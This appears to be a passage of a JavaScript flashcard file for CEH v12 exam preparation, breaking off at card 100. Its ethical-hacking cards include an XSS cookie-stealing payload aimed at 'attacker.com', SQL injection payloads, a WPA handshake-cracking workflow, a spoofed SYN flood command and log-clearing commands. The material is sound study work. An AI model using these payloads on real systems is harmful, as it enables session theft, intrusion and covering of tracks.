// ─────────────────────────────────────────────────────────────────────────────
// ALL CARDS — 200 questions modelled on real CEH v12 312-50 exam patterns
// Sources: ExamTopics 312-50v12 (317 Q pool), ITExams, CEH v12 official book,
//          awslagi.com question discussions, community-verified answers
// ─────────────────────────────────────────────────────────────────────────────
const CARDS = [

  // ══ MODULE 1 — INTRO / ETHICAL HACKING FOUNDATIONS ═══════════════════════
  { id:1, cat:"Foundations", diff:"E",
    q:"What are the three phases of the Cyber Kill Chain in order?",
    a:"Reconnaissance → Weaponisation → Delivery → Exploitation → Installation → C2 → Actions on Objectives (7 phases, Lockheed Martin model). CEH emphasises Recon, Delivery, and Actions on Objectives as exam focus points." },
  { id:2, cat:"Foundations", diff:"E",
    q:"What does the MITRE ATT&CK framework provide that the Cyber Kill Chain does not?",
    a:"Granular, real-world TTPs (Tactics, Techniques, and Procedures) mapped to actual threat actor behaviour. Kill Chain shows high-level stages; ATT&CK maps hundreds of specific techniques used in each stage." },
  { id:3, cat:"Foundations", diff:"M",
    q:"A hacker gains access to a target system and installs a backdoor for future access. Which phase of the CEH attack lifecycle is this?",
    a:"Maintaining Access — after gaining access, the attacker establishes persistence (backdoor, rootkit, RAT) to retain control for future use." },
  { id:4, cat:"Foundations", diff:"E",
    q:"What is an Advanced Persistent Threat (APT)?",
    a:"A prolonged, targeted attack in which an intruder gains access to a network and remains undetected for a long time. Typically nation-state or sophisticated criminal groups. Objective: data exfiltration, not destruction." },
  { id:5, cat:"Foundations", diff:"M",
    q:"What is the Diamond Model of Intrusion Analysis?",
    a:"A framework with four vertices: Adversary, Capability, Infrastructure, Victim. Used to analyse intrusions by mapping relationships between these four components. New in CEH v12." },
  { id:6, cat:"Foundations", diff:"E",
    q:"What is the difference between a vulnerability, a threat, and a risk?",
    a:"Vulnerability: weakness in a system. Threat: potential cause of harm (actor or event exploiting a vulnerability). Risk = Likelihood × Impact of a threat exploiting a vulnerability." },
  { id:7, cat:"Foundations", diff:"E",
    q:"What are the five elements of the CIA Triad + extended?",
    a:"CIA Triad: Confidentiality, Integrity, Availability. Extended (Parkerian Hexad adds): Possession/Control, Authenticity, Utility." },

  // ══ MODULE 2 — FOOTPRINTING ═══════════════════════════════════════════════
  { id:8, cat:"Footprinting", diff:"E",
    q:"Gerard, a disgruntled ex-employee, performs DNS footprinting to gather info about DNS servers and identify hosts. Which tool would help him enumerate DNS zone data?",
    a:"nslookup, dig, or host for DNS queries. For automated zone transfers: fierce, dnsenum. The DNS zone transfer (AXFR) query reveals all internal hostnames if misconfigured." },
  { id:9, cat:"Footprinting", diff:"M",
    q:"An attacker uses Google dork: 'intitle:\"index of\" site:target.com' — what is he looking for?",
    a:"Directory listings — web servers with directory browsing enabled expose their file structure, potentially revealing backup files, configuration files, and sensitive documents." },
  { id:10, cat:"Footprinting", diff:"E",
    q:"What tool is used to gather email addresses, subdomains, hosts, employee names, and open ports from public sources?",
    a:"theHarvester — aggregates data from search engines (Google, Bing), social networks (LinkedIn), and certificate transparency logs. Run: theHarvester -d target.com -b google" },
  { id:11, cat:"Footprinting", diff:"M",
    q:"What type of DNS record maps a hostname to an IPv4 address?",
    a:"A record (Address record). AAAA = IPv6. MX = mail exchanger. CNAME = alias. NS = nameserver. PTR = reverse lookup (IP to hostname). SOA = Start of Authority." },
  { id:12, cat:"Footprinting", diff:"H",
    q:"An attacker uses Shodan and discovers an industrial control system accessible on the internet. What type of reconnaissance is this?",
    a:"Passive reconnaissance — Shodan indexes publicly available banner information without the attacker directly probing the target. No packets are sent to the target system itself." },
  { id:13, cat:"Footprinting", diff:"M",
    q:"What is the purpose of competitive intelligence gathering in footprinting?",
    a:"Gathering information about competitors or targets from public sources: press releases, job postings (reveal tech stack), financial filings, LinkedIn profiles, and news articles — all without alerting the target." },
  { id:14, cat:"Footprinting", diff:"M",
    q:"Which of the following is NOT a passive footprinting technique? A) WHOIS lookup  B) Banner grabbing  C) DNS enumeration  D) Social media research",
    a:"B — Banner grabbing is ACTIVE because it involves directly connecting to and interacting with the target service (e.g., Netcat to port 80). The others are passive." },
  { id:15, cat:"Footprinting", diff:"H",
    q:"What does a WHOIS record reveal that is most useful for an attacker?",
    a:"Registrar info, nameservers (NS records), admin/technical contact emails (used for spear phishing or social engineering), IP ranges associated with the domain, and registration/expiry dates." },

  // ══ MODULE 3 — SCANNING ══════════════════════════════════════════════════
  { id:16, cat:"Scanning", diff:"E",
    q:"You want to scan a target with least noise to evade IDS. Which Nmap command is best? A) nmap -A -Pn  B) nmap -sP -p-65535 -T5  C) nmap -sT -O -T0  D) nmap -A --host-timeout 99 -T1",
    a:"C — nmap -sT -O -T0. The -T0 (Paranoid) timing template is the slowest and least detectable. -sT does TCP connect scans which, while louder than -sS, paired with T0 minimises IDS triggering." },
  { id:17, cat:"Scanning", diff:"M",
    q:"During a red team assessment, a CEH must scan without revealing their IP. Which technique and Nmap flag should they use?",
    a:"IDLE/IPID scan using -sI [zombie_host]. Uses a third-party zombie host's IP ID sequence to infer open ports on the target. Attacker's IP never appears in target logs." },
  { id:18, cat:"Scanning", diff:"M",
    q:"A CEH wants to spoof IP addresses during scanning using Hping3. Which command achieves this? A) hping3 -1 10.0.0.25  B) hping3 -2 10.0.0.25 -p 80  C) hping3 -S 192.168.1.1 -a 192.168.1.254 -p 22 --flood  D) nmap -sS -T4",
    a:"C — hping3 -S sends SYN packets, -a spoofs source IP to 192.168.1.254, targeting 192.168.1.1 port 22. The -a flag in hping3 specifies the spoofed source address." },
  { id:19, cat:"Scanning", diff:"E",
    q:"What is the difference between a SYN scan (-sS) and a TCP Connect scan (-sT)?",
    a:"SYN scan: sends SYN, gets SYN-ACK (open) or RST (closed), then sends RST — never completes handshake. Stealthier, needs root. TCP Connect: completes full 3-way handshake — louder, logged by OS, doesn't need root." },
  { id:20, cat:"Scanning", diff:"M",
    q:"What does an XMAS scan send, and what response indicates an open port?",
    a:"XMAS sends packets with FIN, PSH, and URG flags set. Open port: NO response (RFC compliant). Closed port: RST. Doesn't work on Windows (which sends RST for all). Used for OS fingerprinting." },
  { id:21, cat:"Scanning", diff:"H",
    q:"A CEH observes that IPID increases by 2 when probing a target through a zombie. What does this indicate?",
    a:"The target port is OPEN. In an Idle scan: if port is open, target sends SYN-ACK to zombie → zombie sends RST → zombie IPID increments. Attacker observes IPID+2 = port open; IPID+1 = port closed." },
  { id:22, cat:"Scanning", diff:"M",
    q:"What does Nmap -sn do and when would you use it?",
    a:"Ping sweep / host discovery — identifies live hosts without port scanning. Useful as a first step to map active hosts before detailed scanning. Also called a 'ping scan'." },
  { id:23, cat:"Scanning", diff:"E",
    q:"Which Nmap scan type is best for scanning UDP services like DNS (53) and SNMP (161)?",
    a:"-sU (UDP scan). Much slower than TCP scans because UDP is connectionless — Nmap sends UDP packets and waits for ICMP port unreachable errors (closed) or no response (open/filtered)." },
  { id:24, cat:"Scanning", diff:"M",
    q:"What does the Nmap -Pn flag do and why is it useful?",
    a:"Skips host discovery (treats all targets as online). Useful when targets block ICMP ping — without -Pn, Nmap would mark them as down and skip scanning. Common in firewalled environments." },

  // ══ MODULE 4 — ENUMERATION ════════════════════════════════════════════════
  { id:25, cat:"Enumeration", diff:"M",
    q:"A CEH performs LDAP enumeration using Python but cannot fetch domain details despite connecting on secure LDAP. What is the most likely cause?",
    a:"The secure LDAP connection was not properly initialised — missing 'use_ssl=True' in the server object creation. Secure LDAP (LDAPS) on port 636 requires explicit SSL/TLS initialisation." },
  { id:26, cat:"Enumeration", diff:"E",
    q:"Which Nmap NSE script would you use to enumerate SMB users on a Windows target?",
    a:"--script smb-enum-users — part of the SMB enumeration script family. Other useful ones: smb-enum-shares, smb-enum-sessions, smb-os-discovery." },
  { id:27, cat:"Enumeration", diff:"M",
    q:"What does SNMPwalk do and what vulnerability does it exploit?",
    a:"SNMPwalk traverses an SNMP MIB tree, retrieving device configuration, routing tables, ARP tables, and system info. Exploits default/weak community strings ('public', 'private') sent in cleartext in SNMPv1/v2." },
  { id:28, cat:"Enumeration", diff:"H",
    q:"What is the difference between scanning and enumeration in the CEH methodology?",
    a:"Scanning: identifies live hosts, open ports, services (broad, less targeted). Enumeration: extracts specific data — usernames, shares, group memberships, password policies — via active connections to identified services. Enumeration is deeper and more targeted." },
  { id:29, cat:"Enumeration", diff:"M",
    q:"Which SMTP commands are used for user enumeration and what do they do?",
    a:"VRFY [user] — server confirms if the user exists. EXPN [list] — expands a mailing list to reveal members. Both can reveal valid email addresses/usernames even without authentication on misconfigured servers." },
  { id:30, cat:"Enumeration", diff:"E",
    q:"What are the NetBIOS name service, datagram, and session ports?",
    a:"137/UDP (Name Service — name registration/resolution), 138/UDP (Datagram Service — connectionless comms), 139/TCP (Session Service — connection-oriented, used for SMB). SMB also runs directly on 445/TCP." },

  // ══ MODULE 5 — VULNERABILITY ANALYSIS ════════════════════════════════════
  { id:31, cat:"Vuln Analysis", diff:"E",
    q:"What does a CVSS base score of 9.5 indicate, and what are the score ranges?",
    a:"Critical severity. Ranges: None=0.0, Low=0.1–3.9, Medium=4.0–6.9, High=7.0–8.9, Critical=9.0–10.0. Base score considers exploitability (attack vector, complexity, privileges, user interaction) and impact (confidentiality, integrity, availability)." },
  { id:32, cat:"Vuln Analysis", diff:"M",
    q:"What is the difference between a vulnerability scan and a penetration test?",
    a:"Vulnerability scan: automated identification of known weaknesses — does NOT exploit. Penetration test: actively exploits vulnerabilities to demonstrate real business impact and test defences. Pentest requires more skill and authorisation." },
  { id:33, cat:"Vuln Analysis", diff:"M",
    q:"Nessus reports a vulnerability on a system, but manual verification shows it does not exist. What is this called?",
    a:"False Positive — scanner incorrectly reports a vulnerability that doesn't exist. Opposite is False Negative (real vuln missed). False negatives are more dangerous because they give false assurance." },
  { id:34, cat:"Vuln Analysis", diff:"H",
    q:"What is the CVE numbering system and who assigns CVE IDs?",
    a:"CVE (Common Vulnerabilities and Exposures) — standardised identifiers for publicly known vulnerabilities (e.g., CVE-2021-44228 for Log4Shell). Assigned by CVE Numbering Authorities (CNAs), coordinated by MITRE. Part of the NVD (National Vulnerability Database)." },

  // ══ MODULE 6 — SYSTEM HACKING ════════════════════════════════════════════
  { id:35, cat:"System Hacking", diff:"E",
    q:"What are the five phases of system hacking in the correct order?",
    a:"1. Gaining Access (exploitation), 2. Escalating Privileges, 3. Maintaining Access (backdoors/rootkits), 4. Executing Applications (keyloggers, spyware), 5. Hiding Files / Covering Tracks. Note: recon/scanning are pre-system-hacking phases." },
  { id:36, cat:"System Hacking", diff:"M",
    q:"John uses Pass-the-Hash to authenticate to a Windows server. What tool would he use?",
    a:"Mimikatz (dump and use hashes), Impacket (psexec.py, wmiexec.py), or Metasploit's psexec module. Pass-the-Hash works because NTLM authentication accepts the hash directly without requiring the plaintext password." },
  { id:37, cat:"System Hacking", diff:"M",
    q:"What is the difference between a dictionary attack and a brute force attack?",
    a:"Dictionary attack: tries passwords from a predefined wordlist — faster but misses complex passwords. Brute force: tries every possible combination — always succeeds eventually but slow. Hybrid attack combines both (wordlist + mutations)." },
  { id:38, cat:"System Hacking", diff:"H",
    q:"An attacker uses Hashcat with the -a 0 flag. What attack mode is this?",
    a:"Straight dictionary attack (-a 0) — uses a wordlist directly. Other modes: -a 1 (combination), -a 3 (mask/brute force), -a 6 (wordlist + mask hybrid), -a 7 (mask + wordlist hybrid)." },
  { id:39, cat:"System Hacking", diff:"M",
    q:"What type of rootkit is the hardest to detect and remove, and why?",
    a:"Kernel-level rootkit — modifies the OS kernel itself (device drivers, kernel modules). Since it runs at Ring 0 (highest privilege), it can intercept all system calls, making it invisible to OS-level tools. Requires offline scanning or reinstall to remove." },
  { id:40, cat:"System Hacking", diff:"M",
    q:"What technique do attackers use to cover tracks after compromising a Windows system?",
    a:"Clear Windows Event Logs (wevtutil cl System/Security/Application), modify file timestamps (timestomping), delete prefetch files, clear PowerShell history, and use tools like Metasploit's clearev command." },
  { id:41, cat:"System Hacking", diff:"H",
    q:"What is a steganography technique and how does it differ from cryptography?",
    a:"Steganography hides the existence of a message inside another file (image, audio, video) — security through obscurity. Cryptography scrambles content but the existence is visible. Steganalysis is the detection of hidden data. Both can be combined." },

  // ══ MODULE 7 — MALWARE ══════════════════════════════════════════════════
  { id:42, cat:"Malware", diff:"E",
    q:"John installs a program claiming to be a video player that secretly opens a backdoor. What type of malware is this?",
    a:"Trojan Horse — disguises itself as legitimate software to trick users into executing it. Unlike viruses/worms, Trojans do NOT self-replicate. They must be executed by the user." },
  { id:43, cat:"Malware", diff:"M",
    q:"What is the key characteristic that distinguishes a worm from a virus?",
    a:"A worm self-replicates and spreads across networks WITHOUT human interaction. A virus requires human action (opening a file, running a program) to propagate. Worms exploit network vulnerabilities or email systems automatically." },
  { id:44, cat:"Malware", diff:"H",
    q:"An attacker uses fileless malware that lives only in RAM. Why is this effective against traditional AV?",
    a:"Traditional AV scans the filesystem for malicious signatures. Fileless malware (using PowerShell, WMI, or LOLBins) leaves no files on disk, so there's no signature to detect. Requires behavioural/memory analysis (EDR) to detect." },
  { id:45, cat:"Malware", diff:"M",
    q:"What are the stages of virus execution?",
    a:"1. Dormant phase (inactive, waiting for trigger), 2. Propagation phase (copies itself to files/disk), 3. Triggering phase (activation condition met), 4. Execution phase (malicious payload runs)." },
  { id:46, cat:"Malware", diff:"M",
    q:"What is a botnet C&C (Command and Control) server and what protocols do botnets commonly use?",
    a:"The attacker's server that sends instructions to all infected bot machines. Common C2 protocols: IRC (legacy), HTTP/HTTPS (most common today — blends with normal traffic), DNS (for covert channels), P2P (resilient, no central point of failure)." },
  { id:47, cat:"Malware", diff:"H",
    q:"What is a polymorphic virus and what makes it hard to detect?",
    a:"A polymorphic virus changes its code/signature with each infection using an encryption/mutation engine, while keeping its original functionality. Signature-based AV cannot match it because the signature changes. Requires heuristic or behaviour-based detection." },
  { id:48, cat:"Malware", diff:"M",
    q:"What is the difference between a RAT and a backdoor?",
    a:"RAT (Remote Access Trojan): full remote control — file browser, webcam, keylogger, shell. Backdoor: a more basic persistent entry point (a hidden account, open port, or service) that allows re-entry. RATs include backdoor functionality but are more feature-rich." },

  // ══ MODULE 8 — SNIFFING ══════════════════════════════════════════════════
  { id:49, cat:"Sniffing", diff:"M",
    q:"A company implements multiple countermeasures against sniffing: static ARP entries, IPv6, SSH instead of Telnet, SFTP instead of FTP. Which threat remains unmitigated?",
    a:"IPv6 does not inherently protect against sniffing if the network layer is still unencrypted. End-to-end encryption (TLS/SSH) protects specific protocols, but any unencrypted protocol remains vulnerable. The real solution is encryption of ALL sensitive traffic." },
  { id:50, cat:"Sniffing", diff:"M",
    q:"What is MAC flooding and what countermeasure prevents it?",
    a:"MAC flooding overwhelms a switch's CAM table with fake MAC addresses, causing it to broadcast all traffic (fail-open to hub mode). Countermeasure: Port Security — limits the number of MAC addresses allowed per switch port." },
  { id:51, cat:"Sniffing", diff:"E",
    q:"What is a MITM attack using ARP and what does the attacker gain?",
    a:"ARP Spoofing/Poisoning: attacker sends fake ARP replies to associate their MAC with victim's IP and/or gateway IP. All traffic flows through attacker → can read/modify credentials, session tokens, and data in real-time." },
  { id:52, cat:"Sniffing", diff:"M",
    q:"Which tool is best for performing ARP poisoning combined with MITM sniffing?",
    a:"Ettercap — supports ARP poisoning, MITM attacks, and real-time sniffing/manipulation of traffic. Also supports plugin-based attacks. Alternative: arpspoof (part of dsniff suite)." },
  { id:53, cat:"Sniffing", diff:"H",
    q:"What is DHCP starvation and what attack does it enable?",
    a:"DHCP starvation floods the DHCP server with requests using spoofed MAC addresses, exhausting the IP address pool. Then the attacker sets up a rogue DHCP server, assigning themselves as the default gateway → MITM position on all new clients." },

  // ══ MODULE 9 — SOCIAL ENGINEERING ═══════════════════════════════════════
  { id:54, cat:"Social Eng.", diff:"E",
    q:"A CEO receives an email appearing to be from the CFO asking for an urgent wire transfer. What type of attack is this?",
    a:"Whaling (spear phishing targeting C-level executives) combined with Business Email Compromise (BEC). The attacker impersonates a trusted senior figure to manipulate financial transactions." },
  { id:55, cat:"Social Eng.", diff:"M",
    q:"An attacker calls the help desk pretending to be a new employee who forgot their password. What technique is this?",
    a:"Vishing (voice phishing) using Pretexting — fabricating a believable scenario (new employee) to manipulate the help desk into resetting credentials. Exploits helpfulness and authority." },
  { id:56, cat:"Social Eng.", diff:"E",
    q:"What are the six principles of influence used in social engineering (Cialdini)?",
    a:"1. Reciprocity, 2. Commitment/Consistency, 3. Social Proof, 4. Authority, 5. Liking, 6. Scarcity. CEH maps these to attack techniques — Authority is most exploited in pretexting/vishing." },
  { id:57, cat:"Social Eng.", diff:"M",
    q:"What is the difference between tailgating and piggybacking?",
    a:"Tailgating: attacker follows an authorised person through a secure door without their knowledge. Piggybacking: the authorised person knowingly holds the door open for the attacker (often under social pressure or false pretence)." },
  { id:58, cat:"Social Eng.", diff:"E",
    q:"What tool is used for automated phishing and credential harvesting in social engineering tests?",
    a:"SET (Social-Engineer Toolkit) — automates phishing pages, credential harvesting, payload delivery. Also: GoPhish (phishing simulation platform), BeEF (Browser Exploitation Framework for client-side attacks)." },

  // ══ MODULE 10 — DoS/DDoS ════════════════════════════════════════════════
  { id:59, cat:"DoS / DDoS", diff:"E",
    q:"Which DoS attack exploits the TCP three-way handshake and what countermeasure specifically defeats it?",
    a:"SYN Flood — sends many SYN packets without completing the handshake, filling the server's half-open connection table. Countermeasure: SYN cookies — server doesn't allocate resources until handshake is completed." },
  { id:60, cat:"DoS / DDoS", diff:"M",
    q:"What is a Smurf attack and why is it amplified?",
    a:"Attacker spoofs victim's IP and sends ICMP echo requests to a network broadcast address. All hosts on the network reply to the victim → amplification factor = number of hosts on network. Countermeasure: disable directed broadcast on routers." },
  { id:61, cat:"DoS / DDoS", diff:"M",
    q:"What is a DNS amplification attack and why is it effective?",
    a:"Attacker sends small DNS queries with spoofed victim IP to open DNS resolvers. Resolver returns large DNS responses to victim (amplification up to 70×). Effective because UDP doesn't verify source IP and DNS responses can be very large (DNSSEC records)." },
  { id:62, cat:"DoS / DDoS", diff:"H",
    q:"What is a Slowloris attack and which server types are most vulnerable?",
    a:"Slowloris sends partial HTTP requests, keeping connections open by sending headers slowly — never completing. Exhausts server's connection pool without high bandwidth. Most vulnerable: Apache (limited connection pool). Nginx (event-driven) is more resistant." },
  { id:63, cat:"DoS / DDoS", diff:"M",
    q:"What is the difference between a volumetric DDoS attack and an application-layer DDoS attack?",
    a:"Volumetric (L3/L4): overwhelms bandwidth — UDP flood, ICMP flood, amplification. Easy to measure in Gbps. Application-layer (L7): targets web application logic — HTTP GET/POST floods, Slowloris. Harder to distinguish from legitimate traffic." },

  // ══ MODULE 11 — SESSION HIJACKING ═══════════════════════════════════════
  { id:64, cat:"Session Hijack", diff:"M",
    q:"What cookie attributes together provide the strongest protection for session tokens?",
    a:"HttpOnly (prevents JS access → blocks XSS theft), Secure (HTTPS-only transmission), SameSite=Strict (blocks CSRF), and a short Max-Age/Expires. Together they address XSS, MITM, and CSRF attack vectors." },
  { id:65, cat:"Session Hijack", diff:"M",
    q:"What is the difference between session fixation and session hijacking?",
    a:"Hijacking: stealing an existing authenticated session token (via XSS, sniffing, MITM). Fixation: attacker sets a known session ID before login; victim authenticates using that ID → attacker already knows the valid session token." },
  { id:66, cat:"Session Hijack", diff:"H",
    q:"What is a cross-site script attack flow that results in session theft?",
    a:"1. Attacker injects <scr\u0069pt>document.location='http://attacker.com/?c='+document.cookie<\/scr\u0069pt> into a vulnerable page. 2. Victim loads page, script executes. 3. Victim's session cookie sent to attacker. 4. Attacker replays cookie to impersonate victim." },

  // ══ MODULE 12 — IDS/FIREWALL EVASION ════════════════════════════════════
  { id:67, cat:"IDS/Firewall", diff:"M",
    q:"What is the difference between a NIDS and a HIDS?",
    a:"NIDS (Network IDS): monitors network traffic on a segment — can detect network-based attacks but not encrypted traffic or host-level events. HIDS (Host IDS): monitors logs, file integrity, system calls on a specific host — detects rootkits, insider threats, log tampering." },
  { id:68, cat:"IDS/Firewall", diff:"M",
    q:"An attacker splits a malicious payload across multiple tiny packets to evade IDS detection. What is this technique called?",
    a:"Packet fragmentation — splits attack across fragments that individually appear benign. The IDS fails to detect it if it doesn't reassemble and inspect the full stream. Countermeasure: fragment reassembly in the IDS/NGFW." },
  { id:69, cat:"IDS/Firewall", diff:"H",
    q:"What is a TTL manipulation attack against an IDS?",
    a:"Sending a decoy packet with TTL just high enough to reach the IDS but not the target. IDS 'sees' and processes the decoy → confused about traffic. Real packet with higher TTL follows. IDS state is out of sync with the target." },
  { id:70, cat:"IDS/Firewall", diff:"M",
    q:"What is the purpose of a DMZ in network architecture?",
    a:"Demilitarised Zone — a network segment between the public internet and internal network. Public-facing servers (web, email, DNS) are placed here. If compromised, the attacker only reaches the DMZ, not the internal LAN. Uses two firewalls (outer + inner)." },
  { id:71, cat:"IDS/Firewall", diff:"E",
    q:"What is the difference between an IDS and an IPS?",
    a:"IDS (Intrusion Detection System): passive — monitors and alerts only. IPS (Intrusion Prevention System): inline — can actively block malicious traffic in real-time. IPS introduces latency; IDS does not. Both use signature-based and anomaly-based detection." },
  { id:72, cat:"IDS/Firewall", diff:"M",
    q:"What is a stateful firewall and how does it differ from a packet filter?",
    a:"Stateful firewall tracks the state of active connections (TCP sessions, UDP pseudo-connections). Allows return traffic automatically. Packet filter (stateless) evaluates each packet independently — can be bypassed with crafted response packets." },

  // ══ MODULE 13 — HACKING WEB SERVERS ════════════════════════════════════
  { id:73, cat:"Web Servers", diff:"M",
    q:"What is a web server misconfiguration that commonly exposes sensitive information to attackers?",
    a:"Directory listing enabled (shows all files), verbose error messages (stack traces with DB info), default pages left in place (Apache test page reveals version), backup files accessible (.bak, .old), and server version in HTTP headers." },
  { id:74, cat:"Web Servers", diff:"M",
    q:"Which common web server configuration file can be misconfigured to provide useful information to a hacker?",
    a:"httpd.conf (Apache), web.config (IIS), nginx.conf (Nginx). These can reveal directory paths, enabled modules, server version, authentication bypass misconfigs, and debug settings if improperly secured." },
  { id:75, cat:"Web Servers", diff:"M",
    q:"What is HTTP response splitting and how is it exploited?",
    a:"Injecting CRLF characters (\\r\\n) into HTTP headers to split one response into two. Can be used for XSS, web cache poisoning, and session fixation. Countermeasure: strip CRLF from all user input used in HTTP headers." },
  { id:76, cat:"Web Servers", diff:"H",
    q:"What is a web cache poisoning attack?",
    a:"Attacker manipulates cached web responses by injecting malicious content that gets stored in a proxy/CDN cache. Subsequent users receive the poisoned response. Requires: cacheable request + ability to inject unkeyed input (headers, cookies) into response." },

  // ══ MODULE 14 — HACKING WEB APPLICATIONS ═══════════════════════════════
  { id:77, cat:"Web Apps", diff:"E",
    q:"What is OWASP A01:2021 Broken Access Control and give a concrete example?",
    a:"Users can act outside intended permissions. Example: IDOR — user changes URL from /account?id=100 to /account?id=101, accessing another user's account. Also includes missing function-level access control, force browsing to admin pages." },
  { id:78, cat:"Web Apps", diff:"M",
    q:"What is the difference between stored XSS and reflected XSS?",
    a:"Stored (Persistent): payload saved in DB, executes for every user viewing the page. Higher severity. Reflected: payload in URL/request, server returns it immediately — requires victim to click malicious link. Both steal cookies/sessions or redirect users." },
  { id:79, cat:"Web Apps", diff:"M",
    q:"How does a CSRF attack work and what is the primary defence?",
    a:"CSRF forges a request from an authenticated user's browser without their knowledge (e.g., hidden form submitting a bank transfer). Primary defence: CSRF tokens (unique per-session value verified server-side). Also: SameSite cookie attribute, re-authentication for sensitive actions." },
  { id:80, cat:"Web Apps", diff:"M",
    q:"What is the difference between LFI and RFI, and which is more dangerous?",
    a:"LFI (Local File Inclusion): includes local server files — can read /etc/passwd, config files, logs. RFI (Remote File Inclusion): includes a remote malicious file from attacker URL — allows remote code execution. RFI is more dangerous because it leads directly to code execution." },
  { id:81, cat:"Web Apps", diff:"H",
    q:"What is a Server-Side Request Forgery (SSRF) attack and what is the cloud-specific target?",
    a:"SSRF tricks a server into making requests to internal resources. In cloud: attacker targets the instance metadata endpoint (169.254.169.254) to retrieve IAM credentials, access tokens, and instance configuration — leading to full cloud account compromise." },
  { id:82, cat:"Web Apps", diff:"M",
    q:"What is the OWASP A10 vulnerability and how is it exploited?",
    a:"SSRF (Server-Side Request Forgery) — server makes HTTP requests controlled by attacker. Exploited by injecting URLs into parameters that trigger server-side fetches. Can bypass firewalls (requests originate from trusted internal server)." },
  { id:83, cat:"Web Apps", diff:"M",
    q:"What is Burp Suite's Repeater function used for in web application testing?",
    a:"Manually resending and modifying captured HTTP/HTTPS requests — useful for testing individual parameters for injection, testing authentication logic, and verifying vulnerabilities found during interception." },

  // ══ MODULE 15 — SQL INJECTION ════════════════════════════════════════════
  { id:84, cat:"SQLi", diff:"E",
    q:"What SQL injection payload is used to bypass a login form?",
    a:"' OR '1'='1' -- (single-line comment) or ' OR 1=1 -- \nMakes WHERE clause always TRUE, returning first record. The -- comments out remainder of query. Single quotes vary by DB: -- for MySQL/MSSQL, # for MySQL, /* for Oracle." },
  { id:85, cat:"SQLi", diff:"M",
    q:"How does Union-based SQL injection work?",
    a:"Appends a UNION SELECT to the original query to retrieve data from other tables. Requires knowing the number of columns and data types. Example: ' UNION SELECT username,password FROM users --\nMust match column count of original query." },
  { id:86, cat:"SQLi", diff:"H",
    q:"How does time-based blind SQL injection confirm vulnerability without visible output?",
    a:"Injects a conditional time-delay: ' AND IF(1=1, SLEEP(5), 0) -- (MySQL). If the response is delayed by 5 seconds, the condition is TRUE and SQLi is confirmed. Data is exfiltrated one bit at a time by observing response timing." },
  { id:87, cat:"SQLi", diff:"M",
    q:"What SQLmap command would enumerate tables in a specific database named 'webapp'?",
    a:"sqlmap -u 'http://target/?id=1' -D webapp --tables\nFirst: --dbs (list databases), then -D [dbname] --tables, then -D [dbname] -T [table] --columns, then --dump to extract data." },
  { id:88, cat:"SQLi", diff:"E",
    q:"What is the MOST effective defence against SQL injection?",
    a:"Parameterised queries (Prepared Statements) — separates SQL code from user data at the database driver level. Input validation and WAFs are defence-in-depth but cannot replace parameterised queries. ORMs typically use prepared statements by default." },
  { id:89, cat:"SQLi", diff:"H",
    q:"What is a second-order SQL injection?",
    a:"Data is safely stored (not executed immediately), but later retrieved and inserted into a SQL query without proper sanitisation. E.g., a username stored as \"admin'--\" is safe on insert, but later used in a query like UPDATE users SET password='x' WHERE username='admin'--'" },

  // ══ MODULE 16 — WIRELESS ═════════════════════════════════════════════════
  { id:90, cat:"Wireless", diff:"E",
    q:"This wireless security protocol uses GCMP-256, HMAC-SHA384, and ECDSA with a 384-bit elliptic curve. What is it?",
    a:"WPA3-Enterprise (192-bit security mode) — provides 192-bit minimum-strength security for sensitive environments. WPA3-Personal uses 128-bit GCMP. WPA2-Enterprise uses CCMP/AES-128." },
  { id:91, cat:"Wireless", diff:"M",
    q:"Why is WEP considered completely broken?",
    a:"WEP uses RC4 with weak 24-bit IVs (Initialization Vectors) that repeat frequently. Statistical analysis of ~50,000–85,000 captured IV packets reveals the key. Tools: Aircrack-ng. Crackable in minutes. Never use." },
  { id:92, cat:"Wireless", diff:"M",
    q:"What is the four-step Aircrack-ng workflow for cracking a WPA handshake?",
    a:"1. airmon-ng start wlan0 (monitor mode)\n2. airodump-ng wlan0mon -c [channel] --bssid [AP MAC] -w capture (capture traffic)\n3. aireplay-ng -0 5 -a [AP MAC] -c [client MAC] wlan0mon (deauth client)\n4. aircrack-ng -w wordlist.txt capture.cap (crack handshake)" },
  { id:93, cat:"Wireless", diff:"M",
    q:"What is a WPS PIN attack and why is it effective?",
    a:"WPS PIN is 8 digits split into two 4-digit halves (last digit is checksum). Each half verified independently → only 11,000 possible combinations. Tool: Reaver. Allows recovery of WPA/WPA2 passphrase. Many routers lock out after failures." },
  { id:94, cat:"Wireless", diff:"H",
    q:"What does WPA3's SAE (Simultaneous Authentication of Equals) protect against?",
    a:"Offline dictionary attacks — even if an attacker captures the WPA3 handshake, they cannot perform offline brute-force attacks. SAE uses Dragonfly key exchange — each attempt requires active interaction with the AP (online brute force, much slower and detectable)." },
  { id:95, cat:"Wireless", diff:"M",
    q:"What is an Evil Twin attack and how does it differ from a rogue access point?",
    a:"Evil Twin: clones an existing legitimate AP's SSID/BSSID to lure clients away (usually with stronger signal). Rogue AP: any unauthorised AP on a network (may not mimic a legitimate one). Evil Twin is a targeted MITM attack; rogue AP is broader." },

  // ══ MODULE 17 — MOBILE ════════════════════════════════════════════════
  { id:96, cat:"Mobile", diff:"E",
    q:"What is the difference between a jailbroken iOS device and a rooted Android device from a security standpoint?",
    a:"Both remove manufacturer/OS restrictions and grant superuser access. Both dramatically increase attack surface: unsigned apps, exposed filesystem, disabled security sandboxes. Jailbroken iOS disables Apple's code signing; rooted Android bypasses Android's permission model." },
  { id:97, cat:"Mobile", diff:"M",
    q:"What is certificate pinning and how do mobile pentesters bypass it?",
    a:"App only accepts a specific hardcoded certificate → blocks Burp Suite MITM. Bypass methods: Frida (dynamic instrumentation), objection (Frida-based), SSL Kill Switch (iOS jailbreak), custom patched APK (Android). Requires device access or jailbreak/root." },
  { id:98, cat:"Mobile", diff:"M",
    q:"What tool is used for Android security testing and what does it enumerate?",
    a:"Drozer — enumerates attack surface: exported activities, content providers, broadcast receivers, services. Can call exported activities, query content providers, and send intents without user interaction." },
  { id:99, cat:"Mobile", diff:"H",
    q:"What are the OWASP Mobile Top 10 categories M1 and M2?",
    a:"M1: Improper Platform Usage (misuse of platform features, permission abuse). M2: Insecure Data Storage (sensitive data in SQLite, SharedPreferences, logs, external storage, or temp files without encryption)." },

  // ══ MODULE 18 — IoT / OT ═════════════════════════════════════════════
  { id:100, cat:"IoT / OT", diff:"E",
    q:"What Shodan search finds all devices with port 23 (Telnet) open that have default credentials?",
